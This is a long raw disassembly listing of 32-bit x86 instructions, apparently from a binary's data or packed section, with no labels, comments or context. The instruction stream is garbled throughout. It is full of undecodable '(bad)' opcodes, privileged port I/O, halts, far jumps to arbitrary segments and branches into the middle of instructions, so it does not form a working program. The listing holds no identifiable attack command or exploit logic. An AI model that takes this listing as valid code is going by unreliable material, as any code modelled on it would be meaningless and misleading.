  411ceb:	mov    al,0x19
  411ced:	test   eax,0xc9c3841e
  411cf2:	jle    0x411cb1
  411cf4:	cld    
  411cf5:	loop   0x411d4a
  411cf7:	adc    eax,0xa989020d
  411cfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cfd:	xchg   esi,eax
  411cfe:	cmp    eax,0x7cd5a349
  411d03:	dec    ebp
  411d04:	inc    ecx
  411d05:	js     0x411d03
  411d07:	jp     0x411cb8
  411d09:	test   eax,0xdcf3c655
  411d0e:	repnz enterw 0xf079,0x95
  411d14:	mov    edx,0x4b5baa35
  411d19:	loopne 0x411cef
  411d1b:	sub    BYTE PTR [edx+0x32],0x78
  411d1f:	pop    ecx
  411d20:	mov    ds:0x51b238c5,al
  411d25:	stos   DWORD PTR es:[edi],eax
  411d26:	dec    ebx
  411d27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d28:	sahf   
  411d29:	ret    0x7f4a
  411d2c:	add    bl,BYTE PTR [esi+0x2c89a535]
  411d32:	mov    ecx,0x981e0c0f
  411d37:	leave  
  411d38:	cdq    
  411d39:	outs   dx,DWORD PTR ds:[esi]
  411d3a:	sbb    esi,DWORD PTR [ebp-0x5f]
  411d3d:	pushf  
  411d3e:	sahf   
  411d3f:	and    ebx,DWORD PTR ds:[esi]
  411d42:	fs push ebp
  411d44:	push   ecx
  411d45:	addr16 push ecx
  411d47:	rcl    BYTE PTR [esi+eiz*8+0x3c8137a],1
  411d4e:	ficom  WORD PTR [ecx-0x4d]
  411d51:	pop    eax
  411d52:	jbe    0x411cfe
  411d54:	popa   
  411d55:	lds    edx,FWORD PTR [ebp+0x6d1a9b6a]
  411d5b:	pop    ecx
  411d5c:	cld    
  411d5d:	cmp    al,0x24
  411d5f:	out    dx,al
  411d60:	mov    WORD PTR [edi-0x7d52ef35],cs
  411d66:	push   esp
  411d67:	pop    ds
  411d68:	addr16 pop eax
  411d6a:	inc    esp
  411d6b:	jp     0x411d22
  411d6d:	mov    ah,0x90
  411d6f:	push   eax
  411d70:	(bad)  
  411d71:	sub    bh,BYTE PTR [edx]
  411d73:	pop    esp
  411d74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d75:	sbb    ch,BYTE PTR [eax-0x796c62af]
  411d7b:	inc    eax
  411d7c:	nop
  411d7d:	xchg   BYTE PTR [ebx+0x6aa9667d],ah
  411d83:	fnstsw WORD PTR [ebx-0x21]
  411d86:	std    
  411d87:	adc    ecx,esi
  411d89:	pop    ebx
  411d8a:	lahf   
  411d8b:	pop    ss
  411d8c:	push   0x795d4d77
  411d91:	or     al,0x66
  411d93:	sbb    BYTE PTR [esi+eax*4+0x3ef26596],bh
  411d9a:	push   ds
  411d9b:	jp     0x411d7b
  411d9d:	jno    0x411d96
  411d9f:	test   eax,0xdc62cb28
  411da4:	dec    esp
  411da5:	inc    edi
  411da6:	xchg   DWORD PTR [edi],ebx
  411da8:	imul   esp,edi,0x49760e26
  411dae:	outs   dx,BYTE PTR ds:[esi]
  411daf:	jmp    0xbbfbc984
  411db4:	fcom   DWORD PTR [edx+0x14]
  411db7:	iret   
  411db8:	push   esi
  411db9:	test   eax,0xada3f06b
  411dbe:	xchg   ecx,eax
  411dbf:	push   edx
  411dc0:	std    
  411dc1:	imul   esp,DWORD PTR [ecx],0x0
  411dc4:	out    dx,al
  411dc5:	mov    ds:0xc4ba8ce4,al
  411dca:	mov    esi,DWORD PTR [ebx]
  411dcc:	dec    ebx
  411dcd:	fcom   DWORD PTR [eax-0x5bdc90a]
  411dd3:	stc    
  411dd4:	jl     0x411e09
  411dd6:	xor    BYTE PTR [ebx],dh
  411dd8:	sbb    DWORD PTR [edx-0x77f6458c],eax
  411dde:	in     eax,0xf1
  411de0:	aad    0xaa
  411de2:	pop    es
  411de3:	xchg   BYTE PTR [edx],cl
  411de5:	add    al,0x6a
  411de7:	mov    ch,0x57
  411de9:	jecxz  0x411e09
  411deb:	fisub  WORD PTR [esi+0x6]
  411dee:	push   cs
  411def:	retf   0x799c
  411df2:	mov    ds:0x9e7e5487,al
  411df7:	(bad)  
  411df8:	aaa    
  411df9:	sbb    BYTE PTR [ecx+0x16],bh
  411dfc:	dec    ebx
  411dfd:	adc    al,0xb
  411dff:	lds    ebx,FWORD PTR [ebp-0x2d8f59b2]
  411e05:	dec    edx
  411e06:	jno    0x411e35
  411e08:	loope  0x411e44
  411e0a:	adc    al,0x5a
  411e0c:	add    bl,BYTE PTR [eax-0x61]
  411e0f:	stos   DWORD PTR es:[edi],eax
  411e10:	mov    bh,0xa2
  411e12:	cmp    ebp,DWORD PTR [esi+0x1d9b9b3a]
  411e18:	xor    cl,bl
  411e1a:	arpl   WORD PTR [ebp+0x16],bp
  411e1d:	mov    WORD PTR ds:0x37fbea9e,ss
  411e23:	out    dx,al
  411e24:	xor    eax,0xe18dd915
  411e29:	stos   BYTE PTR es:[edi],al
  411e2a:	fwait
  411e2b:	inc    edx
  411e2c:	dec    esi
  411e2d:	push   es
  411e2e:	rol    DWORD PTR ds:0x22d0a0b4,cl
  411e34:	adc    BYTE PTR es:[esi+ebp*8-0x5c],bh
  411e39:	add    al,0xac
  411e3b:	or     eax,0x44046fc1
  411e40:	fidiv  WORD PTR [edi+0x33630a70]
  411e46:	lahf   
  411e47:	test   DWORD PTR [eax],edi
  411e49:	mov    eax,ds:0x4e03f795
  411e4e:	add    eax,0x725c3eb8
  411e53:	jecxz  0x411e4a
  411e55:	cs inc ebp
  411e57:	cld    
  411e58:	rol    DWORD PTR [ebp+0x18],0x2e
  411e5c:	fcom   st(6)
  411e5e:	sbb    DWORD PTR [edx-0x2b],esi
  411e61:	or     al,0xba
  411e63:	mov    esi,0x61ac7308
  411e68:	mov    dl,0xa9
  411e6a:	and    eax,0x64427cdd
  411e6f:	test   al,0x32
  411e71:	gs mov ch,0x5e
  411e74:	xor    ch,BYTE PTR [edi+0x728f278d]
  411e7a:	pop    eax
  411e7b:	add    BYTE PTR ds:0xc49ec3b1,al
  411e81:	pop    edi
  411e82:	ret    
  411e83:	sahf   
  411e84:	push   ecx
  411e85:	or     edx,ebx
  411e87:	shl    BYTE PTR [ebp-0x596f3a31],1
  411e8d:	xchg   esp,eax
  411e8e:	rcr    BYTE PTR [esi],0x42
  411e91:	scas   eax,DWORD PTR es:[edi]
  411e92:	or     esp,DWORD PTR [eax-0x2b]
  411e95:	cmp    eax,0xc156e461
  411e9a:	jp     0x411eb6
  411e9c:	or     bh,BYTE PTR [edi+eiz*8-0x4d13b4f3]
  411ea3:	test   eax,0x15803d6d
  411ea8:	jne    0x411ec4
  411eaa:	popf   
  411eab:	mov    ch,0x68
  411ead:	nop
  411eae:	or     eax,0x60282add
  411eb3:	out    0x4e,al
  411eb5:	and    BYTE PTR [edx],al
  411eb7:	cdq    
  411eb8:	imul   edi,edx,0x9ede15fb
  411ebe:	sbb    eax,0xd97061ac
  411ec3:	icebp  
  411ec4:	shr    BYTE PTR [ecx-0xc92072c],1
  411eca:	inc    ecx
  411ecb:	outs   dx,DWORD PTR ds:[esi]
  411ecc:	std    
  411ecd:	imul   BYTE PTR [ebx+0x34b34dd]
  411ed3:	dec    ebx
  411ed4:	imul   esp,DWORD PTR [ecx+0x54],0xbe4f76b1
  411edb:	sbb    DWORD PTR [ebx-0x71c766d7],0xbf6e3202
  411ee5:	cmp    DWORD PTR [ebp-0x5f153464],edi
  411eeb:	add    dl,BYTE PTR [ecx]
  411eed:	test   edi,0x4484d9f1
  411ef3:	ja     0x411e99
  411ef5:	push   ebx
  411ef6:	mov    edx,0xabee01b2
  411efb:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411efd:	arpl   bx,ax
  411eff:	and    dl,BYTE PTR [eax+0x2b]
  411f02:	int    0xb6
  411f04:	xor    BYTE PTR [ebx-0xdd4e633],al
  411f0a:	mov    ds:0xca82528c,al
  411f0f:	push   ecx
  411f10:	dec    esp
  411f11:	scas   al,BYTE PTR es:[edi]
  411f12:	xchg   edx,eax
  411f13:	sub    dh,ch
  411f15:	adc    al,0x41
  411f17:	in     al,dx
  411f18:	les    ebx,FWORD PTR [esi+0x3de88f40]
  411f1e:	pop    ss
  411f1f:	pop    ebp
  411f20:	lock pushf 
  411f22:	fdivr  QWORD PTR [eax-0x61]
  411f25:	mov    ds,WORD PTR [edi-0x6a]
  411f28:	hlt    
  411f29:	mov    cl,0x98
  411f2b:	push   es
  411f2c:	push   ds
  411f2d:	or     al,0x26
  411f2f:	dec    edx
  411f30:	sub    esi,DWORD PTR ds:0x72aaefda
  411f36:	test   eax,0xa1357b91
  411f3b:	dec    edi
  411f3c:	cs aaa 
  411f3e:	addr16 pop ebp
  411f40:	(bad)  
  411f41:	aas    
  411f42:	fcmovu st,st(2)
  411f44:	cld    
  411f45:	sub    bh,BYTE PTR [ebp+0x56f0f30d]
  411f4b:	cmp    ebp,ebp
  411f4d:	sbb    al,0xd2
  411f4f:	and    edi,DWORD PTR [edx+0x13]
  411f52:	fwait
  411f53:	or     al,0xa2
  411f55:	pop    edx
  411f56:	mov    ecx,0x829e85fa
  411f5b:	push   es
  411f5c:	scas   al,BYTE PTR es:[edi]
  411f5d:	loopne 0x411f37
  411f5f:	push   edi
  411f60:	cmp    BYTE PTR [edx+eax*4],cl
  411f63:	push   ds
  411f64:	dec    esp
  411f65:	jg     0x411f50
  411f67:	sbb    BYTE PTR [esi-0x29],cl
  411f6a:	and    eax,0xc47230f3
  411f6f:	js     0x411fc1
  411f71:	pop    edi
  411f72:	jmp    0x411fda
  411f74:	mov    ah,0xdd
  411f76:	imul   esi,DWORD PTR [ebp*8-0x55b74e99],0xffffffe7
  411f7e:	pop    esi
  411f7f:	cmc    
  411f80:	sub    BYTE PTR [ecx-0x4ada69f],0xa
  411f87:	loop   0x411f6d
  411f89:	xchg   esi,eax
  411f8a:	gs cwde 
  411f8c:	scas   eax,DWORD PTR es:[edi]
  411f8d:	xchg   edx,eax
  411f8e:	mov    eax,0x71dd9666
  411f93:	mov    ds:0xf3f250d7,al
  411f98:	dec    edx
  411f99:	inc    eax
  411f9a:	(bad)  
  411f9c:	mov    al,ds:0xc0ccebeb
  411fa1:	sahf   
  411fa2:	lahf   
  411fa3:	lods   al,BYTE PTR ds:[esi]
  411fa4:	inc    ebp
  411fa5:	inc    ecx
  411fa6:	cli    
  411fa7:	mov    edi,0x3cd32813
  411fac:	retf   
  411fad:	sbb    ch,dl
  411faf:	cmp    cl,al
  411fb1:	lods   eax,DWORD PTR ds:[esi]
  411fb2:	js     0x411f4f
  411fb4:	adc    al,0x59
  411fb6:	popf   
  411fb7:	jne    0x411f4f
  411fb9:	dec    edi
  411fba:	mov    DWORD PTR [eax+0x700b99],ebx
  411fc0:	add    al,0xc7
  411fc2:	ror    BYTE PTR [eax+edi*1],cl
  411fc5:	int    0xb
  411fc7:	xchg   edi,eax
  411fc8:	loop   0x411fca
  411fca:	and    al,BYTE PTR [eax+edx*2-0x3a]
  411fce:	nop
  411fcf:	dec    ebp
  411fd0:	dec    edx
  411fd1:	dec    eax
  411fd2:	jbe    0x412032
  411fd4:	jp     0x411f89
  411fd6:	and    ebx,DWORD PTR [edx]
  411fd8:	jle    0x411fd2
  411fda:	pop    ebp
  411fdb:	mov    cl,0x2e
  411fdd:	mov    bl,0xeb
  411fdf:	pusha  
  411fe0:	dec    eax
  411fe1:	inc    edx
  411fe2:	aas    
  411fe3:	in     al,dx
  411fe4:	xor    eax,0x3491d416
  411fe9:	xor    BYTE PTR [edx+0x219453d4],dl
  411fef:	stc    
  411ff0:	mov    edi,0xd7a53a1d
  411ff5:	sub    DWORD PTR [eax],ecx
  411ff7:	cmp    eax,0x4ca7bcd0
  411ffc:	ret    0x2bf0
  411fff:	jp     0x412045
  412001:	ds jbe 0x411f99
  412004:	mov    ebp,DWORD PTR cs:[eax]
  412007:	fst    DWORD PTR [edx-0x57]
  41200a:	(bad)  
  41200c:	jp     0x412013
  41200e:	(bad)  
  41200f:	or     eax,0x35d98b61
  412014:	inc    ebp
  412015:	je     0x412045
  412017:	and    DWORD PTR [eax+eax*1-0x1f],0xb638b3aa
  41201f:	push   ds
  412020:	adc    edi,DWORD PTR [edi+eax*1-0x50]
  412024:	cmp    BYTE PTR [eax-0x2f0bc02e],cl
  41202a:	cld    
  41202b:	repz add BYTE PTR [edi],ch
  41202e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41202f:	das    
  412030:	stc    
  412031:	fwait
  412032:	jo     0x411fcb
  412034:	into   
  412035:	data16 loopne 0x41201c
  412038:	scas   eax,DWORD PTR es:[edi]
  412039:	sub    al,bl
  41203b:	jg     0x412026
  41203d:	cld    
  41203e:	mov    DWORD PTR [edi-0x3d],ebx
  412041:	jne    0x41200b
  412043:	inc    BYTE PTR [ebp-0x658632e7]
  412049:	add    ah,bl
  41204b:	and    bl,cl
  41204d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41204e:	mov    ebx,0xf5069027
  412053:	pop    ebx
  412054:	jno    0x4120c9
  412056:	pop    ecx
  412057:	xor    al,BYTE PTR [edi]
  412059:	xchg   ecx,eax
  41205a:	and    dl,BYTE PTR [ebx-0xc57a1d2]
  412060:	mov    dl,0xf3
  412062:	jae    0x4120c3
  412064:	push   esi
  412065:	pushf  
  412066:	xor    bl,BYTE PTR [esp+eax*8+0x7]
  41206a:	xchg   ebp,eax
  41206b:	sbb    BYTE PTR [eax],bh
  41206d:	pushw  es
  41206f:	cmp    ebp,ecx
  412071:	mov    al,0x9c
  412073:	(bad)  
  412074:	push   ebp
  412075:	fimul  WORD PTR [ebx-0x1a]
  412078:	aas    
  412079:	hlt    
  41207a:	push   0x2
  41207c:	ins    BYTE PTR es:[edi],dx
  41207d:	cld    
  41207e:	(bad)  
  41207f:	jns    0x4120ea
  412081:	dec    ebp
  412082:	xchg   ebx,eax
  412083:	mov    bl,0xaf
  412085:	hlt    
  412086:	fisub  DWORD PTR [ebx+0x34c5a7cd]
  41208c:	(bad)  
  41208d:	test   DWORD PTR [esi-0x766b4df2],0x9c1d0eb7
  412097:	fdiv   st,st(7)
  412099:	and    BYTE PTR [ebx+0x6],bh
  41209c:	(bad)  
  41209d:	mov    ebx,0x8d66e3db
  4120a2:	add    esp,esp
  4120a4:	or     eax,0x7ef667c0
  4120a9:	stos   DWORD PTR es:[edi],eax
  4120aa:	lds    edx,FWORD PTR [esi+esi*1-0x117671a8]
  4120b1:	push   ds
  4120b2:	ins    DWORD PTR es:[edi],dx
  4120b3:	and    bh,ch
  4120b5:	js     0x4120e5
  4120b7:	jle    0x412127
  4120b9:	mov    eax,ds:0x8fe58555
  4120be:	inc    edx
  4120bf:	lods   eax,DWORD PTR ss:[esi]
  4120c1:	cmp    ebp,ecx
  4120c3:	inc    ebp
  4120c4:	mov    edx,edx
  4120c6:	mov    ah,0x23
  4120c8:	and    BYTE PTR [edi+0x420bfcbc],0x15
  4120cf:	rep lods al,BYTE PTR ds:[esi]
  4120d1:	pop    ebp
  4120d2:	mov    bh,0x3c
  4120d4:	clc    
  4120d5:	sbb    al,dl
  4120d7:	push   ds
  4120d8:	mov    dh,bh
  4120da:	sbb    DWORD PTR cs:[eax-0x1fa89301],edx
  4120e1:	test   al,0xdd
  4120e3:	xor    eax,0xfb6d456c
  4120e8:	stos   DWORD PTR es:[edi],eax
  4120e9:	and    eax,0x25a88d5a
  4120ee:	lock test BYTE PTR [edx],dl
  4120f1:	fsub   QWORD PTR [ebx+0x9]
  4120f4:	inc    edi
  4120f5:	sbb    BYTE PTR [ecx+0x75],ch
  4120f8:	adc    cl,ah
  4120fa:	out    dx,al
  4120fb:	(bad)  
  4120fc:	outs   dx,BYTE PTR ds:[esi]
  4120fd:	dec    esi
  4120fe:	mov    ebx,0xa4066c9f
  412103:	mov    ds:0x793f6ca6,eax
  412108:	into   
  412109:	(bad)  
  41210a:	pop    ecx
  41210b:	xor    ch,0x6c
  41210e:	cli    
  41210f:	call   0x597ea232
  412114:	push   ss
  412115:	mov    ch,0xb4
  412117:	mov    DWORD PTR [ecx],0x4b936ed3
  41211d:	mov    ds:0xa1bf9d09,eax
  412122:	stos   BYTE PTR es:[edi],al
  412123:	adc    DWORD PTR ds:0x4b5b6321,ecx
  412129:	or     BYTE PTR [ebx],ah
  41212b:	mov    DWORD PTR [ebx-0x7],edi
  41212e:	(bad)  [ebp+0x7b9e3dcb]
  412134:	push   esi
  412135:	add    al,BYTE PTR [ecx]
  412137:	cmp    DWORD PTR [ecx+0x3a],0x68
  41213b:	jno    0x4121ac
  41213d:	push   esp
  41213e:	(bad)  
  41213f:	jmp    0xbad2:0x570c821d
  412146:	xchg   edx,eax
  412147:	into   
  412148:	push   0x8
  41214a:	mov    al,ds:0x8cda15e5
  41214f:	mov    ss,WORD PTR [edi+0x19]
  412152:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412153:	popa   
  412154:	retf   
  412155:	xlat   BYTE PTR ds:[ebx]
  412156:	cmc    
  412157:	and    bl,BYTE PTR [ebx-0x1120c594]
  41215d:	and    eax,0x21a0a09d
  412162:	sar    ecx,cl
  412164:	add    DWORD PTR [esp+ebx*4],esi
  412167:	daa    
  412168:	jno    0x4121b0
  41216a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41216b:	test   DWORD PTR [esp+ebx*1+0xf2ec5ff],edi
  412172:	or     al,0x48
  412174:	rcr    DWORD PTR [ecx-0x32d84ed],1
  41217a:	mov    dh,0x2c
  41217c:	jae    0x4121a6
  41217e:	xor    al,0xf3
  412180:	leave  
  412181:	sbb    BYTE PTR [ebx+0x1c8c202b],dl
  412187:	ds in  eax,0x10
  41218a:	inc    eax
  41218b:	mov    WORD PTR [edx],ss
  41218d:	scas   al,BYTE PTR es:[edi]
  41218e:	je     0x41212c
  412190:	jnp    0x4121de
  412192:	sbb    bl,0x4
  412195:	and    ecx,DWORD PTR [eax-0x51]
  412198:	inc    ebx
  412199:	lahf   
  41219a:	not    DWORD PTR [esi+0x3e416f7e]
  4121a0:	clc    
  4121a1:	stc    
  4121a2:	gs add esp,edx
  4121a5:	outs   dx,BYTE PTR ds:[esi]
  4121a6:	mov    esp,0xb5e0269d
  4121ab:	hlt    
  4121ac:	clc    
  4121ad:	ja     0x41222b
  4121af:	cmc    
  4121b0:	mov    DWORD PTR [eax-0x659a0d9b],esi
  4121b6:	jmp    0x4121e9
  4121b8:	mov    ds:0xc6784c84,eax
  4121bd:	and    al,0x2c
  4121bf:	push   0x61132f65
  4121c4:	fisttp DWORD PTR [edi+edx*4-0x74]
  4121c8:	lea    ebx,[ecx+0x66]
  4121cb:	inc    ecx
  4121cc:	mov    ds:0x32024151,al
  4121d1:	sub    BYTE PTR [eax+0x428fbb0e],bl
  4121d7:	inc    edi
  4121d8:	rcr    DWORD PTR [edi-0x40],cl
  4121db:	lds    ebx,FWORD PTR [edi+0x5a682202]
  4121e1:	push   ss
  4121e2:	mov    dx,0x73b1
  4121e6:	stos   DWORD PTR es:[edi],eax
  4121e7:	mov    ds:0xc774db6f,eax
  4121ec:	sub    eax,0xd7c66df0
  4121f1:	pop    esi
  4121f2:	out    0xde,al
  4121f4:	in     al,0xb2
  4121f6:	pop    edi
  4121f7:	arpl   WORD PTR [ebx+0x64ade49d],si
  4121fd:	(bad)  
  4121fe:	imul   ebp,DWORD PTR ds:0x1766daf2,0x24
  412205:	aam    0xba
  412207:	cwde   
  412208:	repz shl DWORD PTR ds:[bp+si],cl
  41220d:	lds    ebp,FWORD PTR [ecx]
  41220f:	jmp    0x4121ea
  412211:	(bad)  
  412212:	std    
  412213:	out    0x2a,al
  412215:	add    ebp,0x433136b9
  41221b:	(bad)  
  41221c:	fidivr DWORD PTR [eax+eax*8+0x45a2052a]
  412223:	icebp  
  412224:	adc    eax,0x64a08862
  412229:	mov    edi,0xccbf3185
  41222e:	sbb    BYTE PTR [eax],bl
  412230:	cli    
  412231:	gs enter 0xc60f,0x73
  412236:	sbb    BYTE PTR [ebp+0x1d],bl
  412239:	dec    ebx
  41223a:	xor    esi,edi
  41223c:	push   edx
  41223d:	cmp    DWORD PTR [edi+0x73],ebx
  412240:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412241:	and    cl,al
  412243:	jns    0x412226
  412245:	(bad)  
  412247:	pop    ebp
  412248:	test   BYTE PTR [edi],bh
  41224a:	fadd   st,st(3)
  41224c:	popa   
  41224d:	(bad)  
  41224f:	push   eax
  412250:	enter  0xbbe9,0x6e
  412254:	rcr    ecx,1
  412256:	popf   
  412257:	clc    
  412258:	in     eax,0xec
  41225a:	fist   WORD PTR [esi+0x30]
  41225d:	cmp    esp,DWORD PTR [edi+esi*8]
  412260:	xchg   cl,al
  412262:	sbb    dl,BYTE PTR [ebp-0x39c90f94]
  412268:	fiadd  DWORD PTR [ebx+eax*4+0x104d9f5]
  41226f:	cli    
  412270:	and    al,0x2b
  412272:	mov    DWORD PTR [ecx-0x28],0xdb1f6047
  412279:	push   ecx
  41227a:	fs ds daa 
  41227d:	or     al,0x20
  41227f:	inc    ecx
  412280:	or     DWORD PTR [ecx-0x5013ba06],ebp
  412286:	mov    ebp,DWORD PTR [ebx+eiz*2+0x21c7e4bc]
  41228d:	and    al,0x6b
  41228f:	stos   DWORD PTR es:[edi],eax
  412290:	and    bl,BYTE PTR [ebx]
  412292:	jmp    0x412282
  412294:	mov    ebp,0x519fe297
  412299:	cmc    
  41229a:	and    al,BYTE PTR [ebp+esi*2+0x62d03560]
  4122a1:	mov    esi,0x6cc3b047
  4122a6:	pop    esi
  4122a7:	pushf  
  4122a8:	jge    0x4122a6
  4122aa:	test   al,0x3b
  4122ac:	inc    ebp
  4122ad:	adc    eax,esp
  4122af:	xchg   ebp,eax
  4122b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122b1:	lods   al,BYTE PTR ds:[esi]
  4122b2:	or     ebx,DWORD PTR [ebp+ecx*2+0x77]
  4122b6:	bound  esp,QWORD PTR [ecx+0x76]
  4122b9:	or     bl,0x81
  4122bc:	repz push 0x68
  4122bf:	push   ebx
  4122c0:	je     0x412297
  4122c2:	jg     0x4122d4
  4122c4:	bnd jb 0x4122a8
  4122c7:	mov    edi,0x38952933
  4122cc:	int3   
  4122cd:	add    esi,DWORD PTR [ecx-0x5d80b75]
  4122d3:	loop   0x412308
  4122d5:	jnp    0x41228c
  4122d7:	xor    esp,DWORD PTR [esi]
  4122d9:	mov    bh,0x91
  4122db:	push   edi
  4122dc:	cmp    eax,0xba994cff
  4122e1:	lds    edi,FWORD PTR [esi+0x1054d903]
  4122e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122e8:	add    edx,DWORD PTR [edi]
  4122ea:	adc    al,0xf4
  4122ec:	dec    edi
  4122ed:	test   DWORD PTR [edx],edx
  4122ef:	jae    0x4122e8
  4122f1:	(bad)  
  4122f2:	aad    0x6e
  4122f4:	dec    ecx
  4122f5:	or     cl,BYTE PTR [esi]
  4122f7:	adc    dl,BYTE PTR [edi]
  4122f9:	fdivr  DWORD PTR ds:0x1676fc8c
  4122ff:	frndint 
  412301:	sub    cl,BYTE PTR [eax+0x70649bb4]
  412307:	and    ecx,edx
  412309:	dec    eax
  41230a:	mov    ecx,0x68133c8e
  41230f:	(bad)  
  412310:	push   ds
  412311:	jmp    0x4122c1
  412313:	ret    
  412314:	out    0x1,eax
  412316:	addr16 cmp eax,0x29b71b65
  41231c:	data16 test BYTE PTR [edx-0x3],0x7c
  412321:	xchg   ebp,eax
  412322:	add    eax,0xb1e4469b
  412327:	mov    ebx,DWORD PTR [eax+edx*1+0x20]
  41232b:	aaa    
  41232c:	jne    0x4123ac
  41232e:	mov    ebp,0x40cdc420
  412333:	aam    0x0
  412335:	push   ss
  412336:	sahf   
  412337:	popf   
  412338:	jle    0x4122df
  41233a:	rol    DWORD PTR [ecx+0x6c08ca65],0x95
  412341:	aam    0xfe
  412343:	ins    BYTE PTR es:[edi],dx
  412344:	nop
  412345:	(bad)  
  412347:	push   ecx
  412348:	leave  
  412349:	jecxz  0x4122f9
  41234b:	pusha  
  41234c:	push   esi
  41234d:	dec    ecx
  41234e:	pop    ebx
  41234f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412350:	fiadd  DWORD PTR [eax+eax*8]
  412353:	jmp    0x85e8:0x1f2bab75
  41235a:	aaa    
  41235b:	shl    al,cl
  41235d:	hlt    
  41235e:	jns    0x41238c
  412360:	xchg   ebx,eax
  412361:	jno    0x4122f3
  412363:	push   edi
  412364:	fdivr  DWORD PTR [ebp-0x18]
  412367:	cmc    
  412368:	ja     0x4122f3
  41236a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41236b:	mov    dl,0x9c
  41236d:	push   ss
  41236e:	ins    BYTE PTR es:[edi],dx
  41236f:	stos   BYTE PTR es:[edi],al
  412370:	and    bh,ch
  412372:	ret    
  412373:	and    al,0xbd
  412375:	data16 fmul DWORD PTR [edi]
  412378:	mov    ds:0xeabd527a,al
  41237d:	fst    QWORD PTR [esi+0x6f]
  412380:	neg    DWORD PTR [edi+0x7a]
  412383:	adc    eax,0x52df3e30
  412388:	inc    ebx
  412389:	sbb    al,0xbf
  41238b:	std    
  41238c:	aaa    
  41238d:	adc    ebx,esp
  41238f:	sbb    ch,ah
  412391:	aam    0x65
  412393:	fimul  DWORD PTR [edi-0x36d6dea9]
  412399:	sub    BYTE PTR [edi+0x67],0xd1
  41239d:	mov    DWORD PTR [ebp*8+0x66cfea19],0x48b57999
  4123a8:	test   eax,0x481de449
  4123ad:	sahf   
  4123ae:	xchg   ecx,eax
  4123af:	loope  0x4123d8
  4123b1:	lahf   
  4123b2:	jb     0x41239f
  4123b4:	inc    ecx
  4123b5:	dec    ebp
  4123b6:	iret   
  4123b7:	push   ss
  4123b8:	push   eax
  4123b9:	ds stc 
  4123bb:	ins    BYTE PTR es:[edi],dx
  4123bc:	sub    al,0xe
  4123be:	out    0x1c,al
  4123c0:	mov    edx,0xda8dbe1f
  4123c5:	retf   
  4123c6:	test   al,0x83
  4123c8:	and    BYTE PTR [ebp+0x58bf491d],bh
  4123ce:	add    bh,BYTE PTR [eax]
  4123d0:	call   0xa3da24b9
  4123d5:	pusha  
  4123d6:	push   0xffffffb2
  4123d8:	test   eax,0xc12f606b
  4123dd:	add    BYTE PTR [ebp-0x496543e5],bh
  4123e3:	or     eax,0xf6c6a904
  4123e8:	or     eax,0x5e6c5c86
  4123ed:	popf   
  4123ee:	mov    cl,BYTE PTR [ebx+0x2437944a]
  4123f4:	fld    TBYTE PTR ds:[edx+0x5eec69a0]
  4123fb:	pop    ebp
  4123fc:	sub    ch,BYTE PTR [ebx]
  4123fe:	jb     0x412436
  412400:	imul   esi
  412402:	popw   es
  412404:	test   al,0x8f
  412406:	dec    ecx
  412407:	jns    0x4123d8
  412409:	xchg   ebp,eax
  41240a:	inc    ebx
  41240b:	pop    ebp
  41240c:	cmp    edi,DWORD PTR [ebx+0x520318c3]
  412412:	adc    al,0xcd
  412414:	test   ecx,ecx
  412416:	dec    ecx
  412417:	xchg   esi,eax
  412418:	mov    ch,BYTE PTR [edi+eax*2-0x54]
  41241c:	daa    
  41241d:	push   0xd1d79128
  412422:	adc    BYTE PTR [ecx+0x7d6dd414],0x52
  412429:	add    dl,BYTE PTR [ebx+eax*2]
  41242c:	pop    ecx
  41242d:	dec    ecx
  41242e:	xlat   BYTE PTR ds:[ebx]
  41242f:	pop    ds
  412430:	xchg   ebx,eax
  412431:	(bad)  
  412433:	jne    0x412437
  412435:	adc    BYTE PTR [esi+0x48],dh
  412438:	ja     0x412405
  41243a:	inc    ebp
  41243b:	aad    0x7d
  41243d:	pusha  
  41243e:	hlt    
  41243f:	dec    BYTE PTR [ecx+eiz*1+0x47]
  412443:	push   ss
  412444:	pop    esp
  412445:	xor    BYTE PTR [ebx+0x388d0a28],dh
  41244b:	clc    
  41244c:	shl    ecx,0xa3
  41244f:	sbb    dl,BYTE PTR [edx-0x29]
  412452:	pop    es
  412453:	push   cs
  412454:	dec    edi
  412455:	pop    eax
  412456:	lds    edi,FWORD PTR [ebp+0x6d]
  412459:	push   ebp
  41245a:	(bad)  
  41245b:	xor    al,0xc
  41245d:	hlt    
  41245e:	sbb    DWORD PTR [ecx*2+0x5612fc0c],esi
  412465:	push   es
  412466:	push   0xffffffff
  412468:	mov    al,BYTE PTR ds:0x27f5377e
  41246e:	cmp    bh,BYTE PTR [edx-0x5d]
  412471:	xor    al,0x1e
  412473:	mov    eax,0xef752704
  412478:	cli    
  412479:	inc    edx
  41247a:	test   al,0x2d
  41247c:	cmp    BYTE PTR [di],0x60
  412480:	sbb    ecx,DWORD PTR [esi]
  412482:	add    DWORD PTR [eax+0x4fca32e4],esi
  412488:	cmp    BYTE PTR [ebx],0x1f
  41248b:	and    eax,DWORD PTR [eax-0x6c]
  41248e:	sub    esi,DWORD PTR ds:0x35dfcced
  412494:	mov    WORD PTR [edi],cs
  412496:	or     DWORD PTR [esp+eax*8],0xffffffe4
  41249a:	mov    ecx,0x409e2642
  41249f:	ins    BYTE PTR es:[edi],dx
  4124a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124a1:	lea    ecx,[eax+0x623ed09d]
  4124a7:	pop    esi
  4124a8:	(bad)  
  4124aa:	dec    eax
  4124ab:	jg     0x4124b8
  4124ad:	je     0x41251a
  4124af:	jo     0x412519
  4124b1:	jp     0x412461
  4124b3:	call   0x2bdb:0xf8af792e
  4124ba:	fidiv  DWORD PTR [edx]
  4124bc:	out    dx,eax
  4124bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
